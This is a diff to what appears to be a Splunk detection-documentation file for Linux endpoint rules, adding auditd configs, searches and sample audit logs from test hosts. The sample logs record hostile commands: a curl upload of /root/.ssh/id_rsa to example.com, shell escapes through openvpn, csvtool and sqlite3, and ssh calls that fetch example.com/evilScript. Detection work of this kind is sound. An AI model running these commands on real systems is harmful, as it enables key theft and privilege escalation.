@@ -111,20 +111,20 @@ Source: https://github.com/splunk/security_content/tree/develop/detections/endpo
 | Linux DD File Overwrite |
 | Linux Kworker Process In Writable Process Path |
 | Linux Ingress Tool Transfer Hunting |
-| Linux Adding Crontab Using List Parameter |
-| Linux Proxy Socks Curl |
-| Linux Change File Owner To Root |
-| [Linux Doas Conf File Creation](#Linux-Doas-Conf-File-Creation) |
-| Linux Ngrok Reverse Proxy Usage |
-| Linux Composer Privilege Escalation |
-| Linux OpenVPN Privilege Escalation |
-| Linux Csvtool Privilege Escalation |
-| [Linux At Allow Config File Creation](#Linux-At-Allow-Config-File-Creation) |
-| Linux Sqlite3 Privilege Escalation |
-| Linux Persistence and Privilege Escalation Risk Behavior |
-| Linux SSH Remote Services Script Execute |
-| Linux Make Privilege Escalation |
-| Linux Node Privilege Escalation(#Linux-Node-Privilege-Escalation) |
+| Linux Adding Crontab Using List Parameter | d |
+| Linux Proxy Socks Curl | d |
+| Linux Change File Owner To Root(#Linux-Change-File-Owner-To-Root) | d |
+| [Linux Doas Conf File Creation](#Linux-Doas-Conf-File-Creation) | d |
+| Linux Ngrok Reverse Proxy Usage(#Linux-Ngrok-Reverse-Proxy-Usage) | d |
+| Linux Composer Privilege Escalation | d |
+| Linux OpenVPN Privilege Escalation | d |
+| Linux Csvtool Privilege Escalation(#Linux-Csvtool-Privilege-Escalation) | d |
+| [Linux At Allow Config File Creation](#Linux-At-Allow-Config-File-Creation) | d |
+| Linux Sqlite3 Privilege Escalation(#Linux-Sqlite3-Privilege-Escalation) | d |
+| Linux Persistence and Privilege Escalation Risk Behavior(#Linux-Persistence-and-Privilege-Escalation-Risk-Behavior) | aggregate rule |
+| Linux SSH Remote Services Script Execute(#Linux-SSH-Remote-Services-Script-Execute) | d |
+| Linux Make Privilege Escalation(#Linux-Make-Privilege-Escalation) | d |
+| Linux Node Privilege Escalation(#Linux-Node-Privilege-Escalation) | d |
 | Linux Setuid Using Setcap Utility | d |
 | Linux Sudo OR Su Execution | d |
 | Linux Stop Services(#Linux-Stop-Services) | d |
@@ -141,7 +141,6 @@ Limitations:
 Sample events:    
 
 ```
- 
 
 ```  
 
@@ -149,6 +148,351 @@ Sample events:
 START:
 
 
+### Linux Ingress Tool Transfer Hunting
+
+Datamodel: 
+Auditd config:   
+CIM Mapping: 
+Search:  
+Limitations:   
+Sample events:    
+
+```
+
+```  
+
+
+
+
+### Linux Adding Crontab Using List Parameter
+
+Datamodel: 
+Auditd config:   
+CIM Mapping: 
+Search:  
+Limitations:   
+Sample events:    
+
+```
+type=CRED_ACQ msg=audit(03/20/2023 12:12:47.039:4525) : pid=13660 uid=test-2 auid=test-2 ses=44 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:setcred grantors=pam_env,pam_unix acct=test-2 exe=/usr/bin/crontab hostname=? addr=? terminal=cron res=success' 
+type=USER_ACCT msg=audit(03/20/2023 12:12:47.039:4524) : pid=13660 uid=test-2 auid=test-2 ses=44 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:accounting grantors=pam_access,pam_unix,pam_localuser acct=test-2 exe=/usr/bin/crontab hostname=? addr=? terminal=cron res=success' 
+type=SYSCALL msg=audit(03/20/2023 12:12:47.030:4523) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x19e7c30 a1=0x19ce350 a2=0x19cdee0 a3=0x7ffe84cdf3e0 items=2 ppid=12751 pid=13660 auid=test-2 uid=test-2 gid=test-2 euid=root suid=root fsuid=root egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=44 comm=crontab exe=/usr/bin/crontab subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=crontab_list 
+type=EXECVE msg=audit(03/20/2023 12:12:47.030:4523) : argc=2 a0=crontab a1=-l 
+type=PATH msg=audit(03/20/2023 12:12:47.030:4523) : item=0 name=/usr/bin/crontab inode=100959688 dev=fd:00 mode=file,suid,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:crontab_exec_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
+type=PROCTITLE msg=audit(03/20/2023 12:12:47.030:4523) : proctitle=crontab -l 
+type=CONFIG_CHANGE msg=audit(03/20/2023 12:12:38.341:4521) : auid=unset ses=unset subj=system_u:system_r:unconfined_service_t:s0 op=add_rule key=crontab_list list=exit res=yes 
+type=CONFIG_CHANGE msg=audit(03/20/2023 12:12:38.324:4453) : auid=unset ses=unset subj=system_u:system_r:unconfined_service_t:s0 op=remove_rule key=crontab_list list=exit res=yes 
+type=CONFIG_CHANGE msg=audit(03/20/2023 12:12:34.674:4379) : auid=root ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 op=add_rule key=crontab_list list=exit res=yes 
+type=CRED_ACQ msg=audit(03/20/2023 12:10:42.879:4236) : pid=13465 uid=test-2 auid=test-2 ses=44 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:setcred grantors=pam_env,pam_unix acct=test-2 exe=/usr/bin/crontab hostname=? addr=? terminal=cron res=success' 
+type=USER_ACCT msg=audit(03/20/2023 12:10:42.879:4235) : pid=13465 uid=test-2 auid=test-2 ses=44 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:accounting grantors=pam_access,pam_unix,pam_localuser acct=test-2 exe=/usr/bin/crontab hostname=? addr=? terminal=cron res=success' 
+```  
+
+
+
+### Linux Proxy Socks Curl
+
+Datamodel: 
+Auditd config:   
+CIM Mapping: 
+Search:  
+Limitations:   
+Sample events:    
+
+```
+type=SYSCALL msg=audit(03/20/2023 12:08:10.234:4206) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x561044233248 a1=0x561044245198 a2=0x561044259020 a3=0x0 items=2 ppid=13266 pid=13268 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts0 ses=44 comm=curl exe=/usr/bin/curl subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=susp_activity 
+type=EXECVE msg=audit(03/20/2023 12:08:10.234:4206) : argc=10 a0=curl a1=-x a2=http://user:pwd@ a3=curl a4=--preproxy a5=socks5://proxy.example a6=-x a7=http://http.example a8=https://example.com127.0.0.1:1234 a9=http://httpbin.org/ip 
+type=PATH msg=audit(03/20/2023 12:08:10.234:4206) : item=0 name=/bin/curl inode=100854595 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
+type=PROCTITLE msg=audit(03/20/2023 12:08:10.234:4206) : proctitle=curl -x http://user:pwd@ curl --preproxy socks5://proxy.example -x http://http.example https://example.com127.0.0.1:1234 http:// 
+type=USER_CMD msg=audit(03/20/2023 12:08:10.226:4203) : pid=13266 uid=test-2 auid=test-2 ses=44 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=curl -x http://user:pwd@ curl --preproxy socks5://proxy.example -x http://http.example https://example.com127.0.0.1:1234 http://httpbin.org/ip terminal=pts/0 res=success' 
+type=SYSCALL msg=audit(03/20/2023 12:08:08.040:4201) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x19f80b0 a1=0x19d77d0 a2=0x19cdee0 a3=0x7ffe84cdf3e0 items=2 ppid=12751 pid=13265 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=44 comm=curl exe=/usr/bin/curl subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=susp_activity 
+type=EXECVE msg=audit(03/20/2023 12:08:08.040:4201) : argc=10 a0=curl a1=-x a2=http://user:pwd@ a3=curl a4=--preproxy a5=socks5://proxy.example a6=-x a7=http://http.example a8=https://example.com127.0.0.1:1234 a9=http://httpbin.org/ip 
+type=PATH msg=audit(03/20/2023 12:08:08.040:4201) : item=0 name=/usr/bin/curl inode=100854595 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
+type=PROCTITLE msg=audit(03/20/2023 12:08:08.040:4201) : proctitle=curl -x http://user:pwd@ curl --preproxy socks5://proxy.example -x http://http.example https://example.com127.0.0.1:1234 http:// 
+type=SYSCALL msg=audit(03/20/2023 12:07:43.427:4198) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x5621f1b9f248 a1=0x5621f1bb1198 a2=0x5621f1bc4f80 a3=0x0 items=2 ppid=13262 pid=13264 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts0 ses=44 comm=curl exe=/usr/bin/curl subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=susp_activity 
+type=EXECVE msg=audit(03/20/2023 12:07:43.427:4198) : argc=6 a0=curl a1=--preproxy a2=socks5://proxy.example a3=-x a4=http://http.example a5=https://example.com 
+type=PATH msg=audit(03/20/2023 12:07:43.427:4198) : item=0 name=/bin/curl inode=100854595 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
+type=PROCTITLE msg=audit(03/20/2023 12:07:43.427:4198) : proctitle=curl --preproxy socks5://proxy.example -x http://http.example https://example.com 
+type=USER_CMD msg=audit(03/20/2023 12:07:43.393:4195) : pid=13262 uid=test-2 auid=test-2 ses=44 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=curl --preproxy socks5://proxy.example -x http://http.example https://example.com terminal=pts/0 res=success' 
+type=SYSCALL msg=audit(03/20/2023 12:06:59.080:4186) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x561338a4b248 a1=0x561338a5d198 a2=0x561338a70f40 a3=0x0 items=2 ppid=13204 pid=13206 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts0 ses=44 comm=curl exe=/usr/bin/curl subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=susp_activity 
+type=EXECVE msg=audit(03/20/2023 12:06:59.080:4186) : argc=4 a0=curl a1=-F a2=userfile=@/root/.ssh/id_rsa a3=http://example.com 
+type=PATH msg=audit(03/20/2023 12:06:59.080:4186) : item=0 name=/bin/curl inode=100854595 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
+type=PROCTITLE msg=audit(03/20/2023 12:06:59.080:4186) : proctitle=curl -F userfile=@/root/.ssh/id_rsa http://example.com 
+type=USER_CMD msg=audit(03/20/2023 12:06:59.043:4183) : pid=13204 uid=test-2 auid=test-2 ses=44 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=curl -F userfile=@/root/.ssh/id_rsa http://example.com terminal=pts
+```  
+
+### Linux Change File Owner To Root
+
+Datamodel: 
+Auditd config:   
+CIM Mapping: 
+Search:  
+Limitations:   
+Sample events:    
+
+```
+type=USER_CMD msg=audit(03/20/2023 11:59:28.831:3642) : pid=12522 uid=test-2 auid=test-2 ses=35 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=chown root evil2_bin terminal=pts/0 res=success' 
+type=SYSCALL msg=audit(03/19/2023 18:53:10.993:895) : arch=x86_64 syscall=chown success=yes exit=0 a0=0x28c48f0 a1=root a2=root a3=0x1b items=1 ppid=2691 pid=2693 auid=root uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=2 comm=yum exe=/usr/bin/python2.7 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=systemdfiles 
+
+```  
+
+
+
+### 
+
+Datamodel: 
+Auditd config:   
+CIM Mapping: 
+Search:  
+Limitations:   
+Sample events:    
+
+```
+ 
+
+```  
+
+
+### Linux Doas Conf File Creation
+Auditd config:- Yes (-w /etc/doas.conf -p wa -k doasconf).  
+CIM Mapping:- file_path, dest, file_create_time, file_name, process_guid.  
+Search:- No change  
+Limitations:-   
+Known false positives:- if you create a file withouth doas being installed.  
+Sample events:   
+```
+type=PATH msg=audit(01/05/2023 18:45:39.929:872) : item=1 name=/etc/doas.conf inode=33563215 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:etc_t:s0 objtype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
+type=PROCTITLE msg=audit(01/05/2023 18:45:39.929:872) : proctitle=vi /etc/doas.conf 
+```
+
+
+### Linux Ngrok Reverse Proxy Usage
+
+Datamodel: 
+Auditd config:   
+CIM Mapping: 
+Search:  
+Limitations:   
+Sample events:    
+
+```
+type=SYSCALL msg=audit(03/20/2023 11:55:44.418:3616) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x26866b0 a1=0x265e1a0 a2=0x265dee0 a3=0x7ffcda9c9160 items=1 ppid=10451 pid=12277 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=35 comm=ngrok exe=/usr/local/bin/ngrok subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=ngrok_reverse_proxy 
+type=EXECVE msg=audit(03/20/2023 11:55:44.418:3616) : argc=3 a0=ngrok a1=http a2=9000 
+type=PATH msg=audit(03/20/2023 11:55:44.418:3616) : item=0 name=/usr/local/bin/ngrok inode=68317430 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:admin_home_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
+type=PROCTITLE msg=audit(03/20/2023 11:55:44.418:3616) : proctitle=ngrok http 9000 
+type=CONFIG_CHANGE msg=audit(03/20/2023 11:55:34.167:3614) : auid=unset ses=unset subj=system_u:system_r:unconfined_service_t:s0 op=add_rule key=ngrok_reverse_proxy list=exit res=yes 
+type=CONFIG_CHANGE msg=audit(03/20/2023 11:55:34.167:3548) : auid=unset ses=unset subj=system_u:system_r:unconfined_service_t:s0 op=remove_rule key=ngrok_reverse_proxy list=exit res=yes 
+type=CONFIG_CHANGE msg=audit(03/20/2023 11:55:27.786:3476) : auid=root ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 op=add_rule key=ngrok_reverse_proxy list=exit res=yes 
+type=USER_CMD msg=audit(03/20/2023 11:53:26.036:3325) : pid=12054 uid=root auid=root ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/root cmd=tar xvzf /root/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin terminal=pts/1 res=success' 
+type=USER_CMD msg=audit(03/20/2023 11:52:56.953:3314) : pid=11994 uid=root auid=root ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/root cmd=tar xvzf /root/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin terminal=pts/1 res=success' 
+type=USER_CMD msg=audit(03/20/2023 11:52:32.627:3312) : pid=11992 uid=root auid=root ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/root cmd=snap install ngrok terminal=pts/1 res=failed' 
+type=USER_CMD msg=audit(03/20/2023 11:52:14.032:3280) : pid=11920 uid=root auid=root ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/root cmd=snap install ngrok terminal=pts/1 res=failed' 
+
+```  
+
+
+### Linux Composer Privilege Escalation
+
+Datamodel: 
+Auditd config:   
+CIM Mapping: 
+Search:  
+
+```
+| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time)
+  as lastTime from datamodel=Endpoint.Processes where Processes.process="*composer*" AND Processes.process="*run-script*" by Processes.dest Processes.user Processes.parent_process_name
+  Processes.process_name Processes.process Processes.process_id Processes.parent_process_id
+  Processes.process_guid | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)`
+  | `security_content_ctime(lastTime)` | `linux_composer_privilege_escalation_filter`
+```
+Limitations:   
+Sample events:    
+
+```
+type=CONFIG_CHANGE msg=audit(03/20/2023 11:47:21.424:3100) : auid=root ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 op=add_rule key=composer_priv_escalation list=exit res=yes 
+type=USER_CMD msg=audit(03/20/2023 11:46:20.572:2968) : pid=11445 uid=test-2 auid=test-2 ses=35 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=composer run-script x terminal=pts/0 res=failed' 
+type=EXECVE msg=audit(03/20/2023 11:46:08.277:2965) : argc=3 a0=chmod a1=+x a2=/usr/local/bin/composer 
+type=PROCTITLE msg=audit(03/20/2023 11:46:08.277:2965) : proctitle=chmod +x /usr/local/bin/composer 
+type=USER_CMD msg=audit(03/20/2023 11:40:22.732:2919) : pid=11052 uid=root auid=root ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/root cmd=php composer-setup.php --install-dir=/usr/local/bin --filename=composer terminal=pts/1 res=success' 
+type=USER_CMD msg=audit(03/20/2023 11:37:41.631:2892) : pid=10874 uid=root auid=root ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/root cmd=php composer-setup.php --install-dir=/usr/local/bin --filename=composer terminal=pts/1 res=success' 
+type=USER_CMD msg=audit(03/20/2023 11:37:21.858:2881) : pid=10815 uid=root auid=root ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/root cmd=php composer-setup.php --install-dir=/usr/local/bin --filename=composer terminal=pts/1 res=success' 
+
+```  
+
+
+
+### Linux OpenVPN Privilege Escalation
+
+Datamodel: 
+Auditd config:   
+CIM Mapping: 
+Search:  
+
+```
+| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time)
+  as lastTime from datamodel=Endpoint.Processes where Processes.process="*openvpn*" AND Processes.process="*--dev*" AND Processes.process="*--script-security*" AND Processes.process="*--up*" by Processes.dest Processes.user Processes.parent_process_name
+  Processes.process_name Processes.process Processes.process_id Processes.parent_process_id
+  Processes.process_guid | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)`
+  | `security_content_ctime(lastTime)` | `linux_openvpn_privilege_escalation_filter`
+```
+Limitations:   
+Sample events:    
+
+```
+type=SYSCALL msg=audit(03/20/2023 11:32:14.283:2813) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x2686570 a1=0x265ace0 a2=0x265dee0 a3=0x7ffcda9c9160 items=2 ppid=10451 pid=10468 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=35 comm=openvpn exe=/usr/sbin/openvpn subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=openvpn_priv_escalation 
+type=EXECVE msg=audit(03/20/2023 11:32:14.283:2813) : argc=9 a0=openvpn a1=--dev a2=null a3=--script-security a4=2 a5=--up a6=/bin/sh a7=-c a8=sh 
+type=PATH msg=audit(03/20/2023 11:32:14.283:2813) : item=0 name=/usr/sbin/openvpn inode=688390 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:openvpn_exec_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
+type=PROCTITLE msg=audit(03/20/2023 11:32:14.283:2813) : proctitle=openvpn --dev null --script-security 2 --up /bin/sh -c sh 
+type=SYSCALL msg=audit(03/20/2023 11:31:58.287:2780) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x5578057e7248 a1=0x5578057f9198 a2=0x55780580def0 a3=0x0 items=2 ppid=10440 pid=10444 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts0 ses=34 comm=openvpn exe=/usr/sbin/openvpn subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=openvpn_priv_escalation 
+type=EXECVE msg=audit(03/20/2023 11:31:58.287:2780) : argc=9 a0=openvpn a1=--dev a2=null a3=--script-security a4=2 a5=--up a6=/bin/sh a7=-c a8=sh 
+type=PATH msg=audit(03/20/2023 11:31:58.287:2780) : item=0 name=/sbin/openvpn inode=688390 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:openvpn_exec_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
+type=PROCTITLE msg=audit(03/20/2023 11:31:58.287:2780) : proctitle=openvpn --dev null --script-security 2 --up /bin/sh -c sh 
+type=USER_CMD msg=audit(03/20/2023 11:31:58.271:2777) : pid=10440 uid=test-2 auid=test-2 ses=34 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=openvpn --dev null --script-security 2 --up /bin/sh -c sh terminal=pts/0 res=success' 
+type=CONFIG_CHANGE msg=audit(03/20/2023 11:31:46.182:2773) : auid=unset ses=unset subj=system_u:system_r:unconfined_service_t:s0 op=add_rule key=openvpn_priv_escalation list=exit res=yes 
+type=CONFIG_CHANGE msg=audit(03/20/2023 11:31:46.172:2709) : auid=unset ses=unset subj=system_u:system_r:unconfined_service_t:s0 op=remove_rule key=openvpn_priv_escalation list=exit res=yes 
+type=CONFIG_CHANGE msg=audit(03/20/2023 11:31:32.876:2638) : auid=root ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 op=add_rule key=openvpn_priv_escalation list=exit res=yes 
+
+```
+
+
+### Linux Csvtool Privilege Escalation
+
+Datamodel: 
+Auditd config:   
+CIM Mapping: 
+Search:
+
+```
+| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time)
+  as lastTime from datamodel=Endpoint.Processes where Processes.process="*csvtool*" AND Processes.process="*call*" by Processes.dest Processes.user Processes.parent_process_name
+  Processes.process_name Processes.process Processes.process_id Processes.parent_process_id
+  Processes.process_guid | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)`
+  | `security_content_ctime(lastTime)` | `linux_csvtool_privilege_escalation_filter`
+```
+
+Limitations:   
+Sample events:    
+
+```
+type=SYSCALL msg=audit(03/20/2023 11:26:35.914:2428) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x211d090 a1=0x211b3a0 a2=0x20f2ee0 a3=0x7ffd64800120 items=3 ppid=1356 pid=9981 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=1 comm=csvtool exe=/usr/bin/python3.6 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=csvtool_priv_escaltion 
+type=EXECVE msg=audit(03/20/2023 11:26:35.914:2428) : argc=4 a0=/usr/bin/python3 a1=/usr/local/bin/csvtool a2=call a3=/bin/sh 
+type=PATH msg=audit(03/20/2023 11:26:35.914:2428) : item=0 name=/usr/local/bin/csvtool inode=688379 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
+type=PROCTITLE msg=audit(03/20/2023 11:26:35.914:2428) : proctitle=/usr/bin/python3 /usr/local/bin/csvtool call /bin/sh 
+type=USER_CMD msg=audit(03/20/2023 11:26:29.368:2427) : pid=9923 uid=test-2 auid=test-2 ses=1 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=csvtool call /bin/sh terminal=pts/0 res=failed' 
+
+```  
+
+
+
+### Linux At Allow Config File Creation
+
+Auditd config: Yes.  ["-w /etc/at.allow -p wa -k atallow", "-w /etc/at.deny -p wa -k atdeny"]
+CIM Mapping: file_path, dest, file_create_time, file_name, process_guid.  
+Search: No change required.  
+Limitations:  
+Sample events:    
+
+```
+type=PATH msg=audit(02/03/2023 19:04:34.591:925) : item=3 name=/etc/at.deny inode=33563218 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:etc_t:s0 objtype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
+```
+
+
+
+### Linux Sqlite3 Privilege Escalation
+
+Datamodel: 
+Auditd config:   
+CIM Mapping: 
+Search:  
+
+```
+| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time)
+  as lastTime from datamodel=Endpoint.Processes where Processes.process="*sqlite3*" AND Processes.process="*.shell*" by Processes.dest Processes.user Processes.parent_process_name
+  Processes.process_name Processes.process Processes.process_id Processes.parent_process_id
+  Processes.process_guid | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)`
+  | `security_content_ctime(lastTime)` | `linux_sqlite3_privilege_escalation_filter`
+```
+
+Limitations:   
+Sample events:    
+
+```
+type=USER_CMD msg=audit(03/20/2023 11:12:04.529:1997) : pid=8890 uid=test-2 auid=test-2 ses=1 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=sqlite3 /dev/nul .shell /bin/bash terminal=pts/0 res=success' 
+type=USER_CMD msg=audit(03/20/2023 11:11:47.494:1990) : pid=8885 uid=test-2 auid=test-2 ses=1 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=sqlite3 /dev/nul .shell /bin/bash terminal=pts/0 res=success' 
+type=CONFIG_CHANGE msg=audit(03/20/2023 11:10:57.396:1978) : auid=unset ses=unset subj=system_u:system_r:unconfined_service_t:s0 op=add_rule key=sqlite3_priv_escalation list=exit res=yes 
+```  
+
+
+### Linux Persistence and Privilege Escalation Risk Behavior
+
+Datamodel: 
+Auditd config:   
+CIM Mapping: 
+Search:  
+Limitations: Risk rule, requires other detections with risk are enabled   
+Sample events:    
+
+```
+
+
+```  
+
+
+
+### Linux SSH Remote Services Script Execute
+
+Datamodel: 
+Auditd config:   
+CIM Mapping: 
+Search:  
+Limitations:   
+Sample events:    
+
+```
+type=SYSCALL msg=audit(03/20/2023 09:48:48.024:1079) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x211ae10 a1=0x210bee0 a2=0x20f2ee0 a3=0x7ffd64800220 items=2 ppid=1356 pid=3642 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=1 comm=ssh exe=/usr/bin/ssh subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=susp_activity 
+type=PROCTITLE msg=audit(03/20/2023 09:48:48.024:1079) : proctitle=/usr/bin/ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no root@192.168.56.102 http://example.com/evilScript 
+type=SYSCALL msg=audit(03/20/2023 09:43:09.295:1023) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x211b3b0 a1=0x211ab60 a2=0x20f2ee0 a3=0x7ffd64800220 items=2 ppid=1356 pid=3280 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=1 comm=ssh exe=/usr/bin/ssh subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=susp_activity 
+type=PROCTITLE msg=audit(03/20/2023 09:43:09.295:1023) : proctitle=/usr/bin/ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no root@192.168.56.102 http://example.com/evilScript 
+type=SYSCALL msg=audit(03/20/2023 09:33:09.086:935) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x211b390 a1=0x210bd10 a2=0x20f2ee0 a3=0x7ffd64800220 items=2 ppid=1356 pid=2651 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=1 comm=ssh exe=/usr/bin/ssh subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=susp_activity 
+type=PROCTITLE msg=audit(03/20/2023 09:33:09.086:935) : proctitle=/usr/bin/ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no root@192.168.56.102 http://example.com/evilScript 
+type=SYSCALL msg=audit(03/20/2023 09:31:45.134:929) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x211ad70 a1=0x210bee0 a2=0x20f2ee0 a3=0x7ffd64800220 items=2 ppid=1356 pid=2595 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=1 comm=ssh exe=/usr/bin/ssh subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=susp_activity 
+type=PROCTITLE msg=audit(03/20/2023 09:31:45.134:929) : proctitle=/usr/bin/ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no root@10.10.10.10 http://example.com/evilScript 
